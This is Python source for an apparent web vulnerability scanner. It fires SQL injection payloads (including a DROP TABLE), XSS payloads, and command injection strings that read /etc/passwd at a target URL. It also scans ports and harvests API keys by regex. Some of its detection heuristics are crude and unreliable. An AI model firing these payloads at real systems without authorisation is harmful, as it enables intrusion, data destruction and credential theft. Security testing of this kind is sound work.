import requests
import threading 
from colorama import Fore,Style
import socket
import whois
import time 
import re 
import os 

class WebSec:
    def __init__(self, url):
        if not url.startswith(("http://", "https://")):
            self.url = "http://" + url
        else:
            self.url = url

    def print_custom_art(self):
        custom_art = """
░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓███████▓▒░ ░▒▓███████▓▒░▒▓████████▓▒░▒▓██████▓▒░  
░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░     ░▒▓█▓▒░        
░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓██████▓▒░ ░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓██████▓▒░░▒▓█▓▒░        
░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░     ░▒▓█▓▒░        
░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░ 
 ░▒▓█████████████▓▒░░▒▓████████▓▒░▒▓███████▓▒░░▒▓███████▓▒░░▒▓████████▓▒░▒▓██████▓▒░  
        """
        screen_width = os.get_terminal_size().columns
        lines = custom_art.strip().split('\n')
        for line in lines:
            print(Fore.RED + line.center(screen_width) + Style.RESET_ALL)

    def get_whois_info(self):
        print("\nRetrieving WHOIS information...")
        domain = self.url.split("://")[-1].split("/")[0]
        try:
            whois_info = whois.whois(domain)
            print(Fore.GREEN + str(whois_info) + Style.RESET_ALL)
        except Exception as e:
            print(f"\n{Fore.RED}Error retrieving WHOIS information: {e}{Style.RESET_ALL}")

    def test_sql_injection(self):
        payloads = [
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "' OR '1'='1' AND SLEEP(5) --",
            "' UNION SELECT NULL, username, password FROM users --",
            "'; DROP TABLE users; --",
            "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --"
        ]
        
        print("\nTesting for SQL Injection...")
        found_vulnerability = False
        severity = "None"
        for payload in payloads:
            try:
                response = requests.get(self.url, params={'input': payload}, timeout=5)
                if response.status_code == 200:
                    if "error" in response.text.lower() or "sql" in response.text.lower():
                        severity = "High"
                        print(f"{Fore.RED}Potential SQL Injection vulnerability detected with payload: {payload}{Style.RESET_ALL}")
                        found_vulnerability = True
            except Exception as e:
                print(f"Error while testing payload '{payload}': {e}")
        
        if not found_vulnerability:
            print(f"{Fore.GREEN}No SQL Injection vulnerabilities found.{Style.RESET_ALL}\n")
        else:
            print(f"{Fore.RED}SQL Injection severity: {severity}{Style.RESET_ALL}\n")
        print(f"{Fore.GREEN}SQL Injection testing completed.")

    def test_xss(self):
        payloads = [
            "<script>alert('XSS');</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<iframe src='javascript:alert(\"XSS\")'></iframe>",
            "'><script>alert('XSS')</script>",
            "<body onload=alert('XSS')>",
            "<input type='text' value='\";alert(1);//'>"
        ]
        
        print("\nTesting for XSS...")
        found_vulnerability = False
        severity = "None"

        for payload in payloads:
            try:
                response = requests.get(self.url, params={'input': payload}, timeout=5)

                if response.status_code == 200 and 'text/html' in response.headers.get('Content-Type',''):
                    if payload in response.text or "alert(1)" in response.text or 'onerror' in response.text or 'onload' in response.text:
                        severity = "High"
                        print(f"{Fore.RED}Potential XSS vulnerability detected with payload: {payload}{Style.RESET_ALL}")
                        found_vulnerability = True
            except Exception as e:
                print(f"Error while testing payload '{payload}': {e}")
        
        if not found_vulnerability:
            print(f"{Fore.GREEN}No XSS vulnerabilities found.{Style.RESET_ALL}\n")
        else:
            print(f"{Fore.RED}XSS severity: {severity}{Style.RESET_ALL}\n")
        print(f"{Fore.GREEN}XSS testing completed.")

    def test_reflected_xss(self):
        reflected_payloads = [
            "<script>alert('Reflected xss');</script>",
            "'><script>alert('Reflected xss');</script>",
            "';alert('Reflected XSS 3');//"
        ]
        print("\nTesting for Reflected XSS...")
        for payload in reflected_payloads:
            try:
                response = requests.get(f"{self.url}?input={payload}",timeout=5)
                if payload in response.text:
                    print(f"{Fore.RED}Potential Reflected XSS vulnerability detected with payload: {payload}{Style.RESET_ALL}")
                else:
                    print(f"{Fore.GREEN}No Reflected XSS vulnerability found for payload: {payload}{Style.RESET_ALL}")

            except Exception as e:
                print(f"Error while testing for reflected XSS : {e}")

    def test_stored_xss(self):
        stored_payloads = [
        "<script>alert('Stored XSS 1');</script>",
        "<img src=x onerror=alert('Stored XSS 2')>",
        "';alert('Stored XSS 3');//",
        "<svg/onload=alert('Stored XSS 4')>",
        "<iframe src='javascript:alert(\"Stored XSS 5\")'></iframe>"
            ]    
        print("\nTesting for Stored XSS...") 
        for payload in stored_payloads:  
            try:
                response_post = requests.post(f"{self.url}/comments", data={'comment': payload}, timeout=5)
                if response_post.status_code == 200:
                    response_get = requests.get(f"{self.url}/comments",timeout=5)
                    if payload in response_get.text:
                        print(f"{Fore.RED}Potential Stored XSS vulnerability detected with payload :{payload}{Style.RESET_ALL}")
                    else:
                        print(f"{Fore.GREEN}No stored XSS vulnerability found.{Style.RESET_ALL}")
            except Exception as e:
                print(f"Error while testing for stored XSS: {e}")


    def test_dom_xss(self):
        dom_payloads = [
            "javascript:alert('DOM XSS')",
            "javascript:alert(document.cookie)",
            "<script>alert('DOM XSS');</script>",
            "<svg/onload=alert('DOM XSS')>"
        ]
        print("\nTesting for DOM XSS...")
        for payload in dom_payloads:
            try:
                response = requests.get(f"{self.url}?param={payload}", timeout=5)
                if payload in response.text:
                    print(f"{Fore.RED}Potential DOM XSS vulnerability detected with payload: {payload}{Style.RESET_ALL}")
                else:
                    print(f"{Fore.GREEN}No DOM XSS vulnerability found for payload: {payload}{Style.RESET_ALL}")
            except Exception as e:
                print(f"Error while testing for DOM XSS: {e}")

    def run_tests(self):
        self.test_reflected_xss()
        self.test_stored_xss()
        self.test_dom_xss()
        
    def test_csrf(self):
        print("\nTesting for CSRF...")
        session = requests.Session()
        response = session.get(self.url, timeout=5)
        
        if "csrf" in response.text.lower() or "token" in response.text.lower():
            print(f"\n{Fore.GREEN}CSRF protection mechanism detected in the form of tokens.{Style.RESET_ALL}")
            print(f"{Fore.RED}CSRF severity: Low{Style.RESET_ALL}\n")
        else:
            print(f"\n{Fore.RED}No CSRF protection mechanism detected.{Style.RESET_ALL}")
            print(f"{Fore.RED}CSRF severity: High{Style.RESET_ALL}\n")
        
        print(f"{Fore.GREEN}CSRF testing completed.")

    def test_command_injection(self):
        payloads = [
            "; cat /etc/passwd",
            "&& cat /etc/passwd",
            "| cat /etc/passwd",
            "; ls",
            "&& ls",
            "| ls",
            "`cat /etc/passwd`",     
            "; whoami",                
            "&& whoami",
            "| whoami"
        ]
        print("\nTesting for Command Injection...")
        found_vulnerability = False
        severity = "None"
        
        for payload in payloads:
            try:
                response = requests.get(self.url, params={'input': payload}, timeout=5)
                if response.status_code == 200:
                    response_text = response.text.lower()
                    if any(indicator in response_text for indicator in ["root:", "user:", "etc/passwd", "etc/shadow"]):
                        severity = "High"
                        print(f"{Fore.RED}Potential Command Injection vulnerability detected with payload: {payload}{Style.RESET_ALL}")
                        found_vulnerability = True

                    elif any(indicator in response_text for indicator in ["linux", "ubuntu", "kernel"]):
                        severity = "Medium"
                        print(f"{Fore.YELLOW}Potential exposure of system information detected with payload: {payload}{Style.RESET_ALL}")
                        found_vulnerability = True

                    elif any(indicator in response_text for indicator in ["command not found", "syntax error"]):
                        severity = "Medium"
                        print(f"{Fore.YELLOW}Potential command execution issue detected with payload: {payload}{Style.RESET_ALL}")
                        found_vulnerability = True

                    elif "path=" in response_text:
                        severity = "Medium"
                        print(f"{Fore.YELLOW}Potential exposure of environment variables detected with payload: {payload}{Style.RESET_ALL}")
                        found_vulnerability = True

            except Exception as e:
                print(f"Error while testing payload '{payload}' : {e}")

        if not found_vulnerability:
            print(f"\n{Fore.GREEN}No Command Injection vulnerabilities found.{Style.RESET_ALL}\n")
        else:
            print(f"{Fore.RED}Command Injection severity: {severity}{Style.RESET_ALL}\n")
        print(f"{Fore.GREEN}Command Injection testing completed.")

    def scan_open_ports(self):
        common_ports = {
            21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP', 53: 'DNS',
            80: 'HTTP', 110: 'POP3', 143: 'IMAP', 443: 'HTTPS', 3306: 'MySQL',
            3389: 'RDP'
        }
        print("\nScanning for open ports...")
        host = self.url.split("://")[-1].split("/")[0].split(":")[0]
        try:
            ip_address = socket.gethostbyname(host)
        except socket.gaierror:
            print(f"{Fore.RED}Unable to resolve IP address for the host: {host}{Style.RESET_ALL}")
            return
        
        open_ports = []

        for port, service in common_ports.items():
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((ip_address, port))
            if result == 0:
                open_ports.append((port, service))
            sock.close()
        if open_ports:
            for port, service in open_ports:
                print(f"\n{Fore.RED}Open port detected: Port {port} ({service}){Style.RESET_ALL}")
        else:
            print(f"{Fore.GREEN}No open ports detected.{Style.RESET_ALL}")
        print(f"{Fore.GREEN}Open ports testing completed.\n")

    def find_api_keys(self,url):
        response = requests.get(url)
        if response.status_code == 200:
            source_code = response.text 

            api_key_patterns = [ 
            r'(api_key|token|key|access_token)[\'"]?[:=][\'"]?([A-Za-z0-9-_]{32,})[\'"]?',
            r'AKIA[0-9A-Z]{16}',
            r'[^A-Za-z0-9](?P<key>[A-Za-z0-9]{40})',
            r'AIza[0-9A-Za-z-_]{35}', 
            r'sk_[0-9a-zA-Z]{32}',    
            r'pk_[0-9a-zA-Z]{32}',
            r'v=[0-9a-zA-Z-_]{20,30}',
            ]
            found_keys = []
            for pattern in api_key_patterns:
                matches = re.findall(pattern, source_code)
                found_keys.extend(matches)

            if found_keys:
                print(Fore.RED + "API Keys found:" + Style.RESET_ALL)
                for idx, key in enumerate(found_keys, start=1):
                    print(f"{idx} - {key}")
            else:
                print(Fore.GREEN + "No API keys found." + Style.RESET_ALL)

            return found_keys
        else:
            print(Fore.YELLOW+"Failed to retrieve URL"+Style.RESET_ALL)
            return []